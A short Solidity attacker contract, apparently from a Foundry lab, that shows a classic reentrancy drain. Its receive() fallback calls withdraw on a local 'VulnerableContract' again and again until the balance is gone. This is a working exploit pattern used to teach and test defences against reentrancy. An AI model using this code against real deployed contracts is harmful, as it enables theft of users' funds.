// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import "./VulnerableContract.sol";
import "forge-std/console2.sol";

contract AttackerContract {
  uint count;
  VulnerableContract public vulnerableContract;

  constructor(address _vulnerableContractAddress) {
    vulnerableContract = VulnerableContract(_vulnerableContractAddress);
  }

  receive() external payable {
    if (address(vulnerableContract).balance >= 1 ether) {
      vulnerableContract.withdraw(1 ether);
    }
  }

  function attack() external payable {
    require(msg.value >= 1 ether);
    vulnerableContract.deposit{value: 1 ether}();
    vulnerableContract.withdraw(1 ether);
  }
}
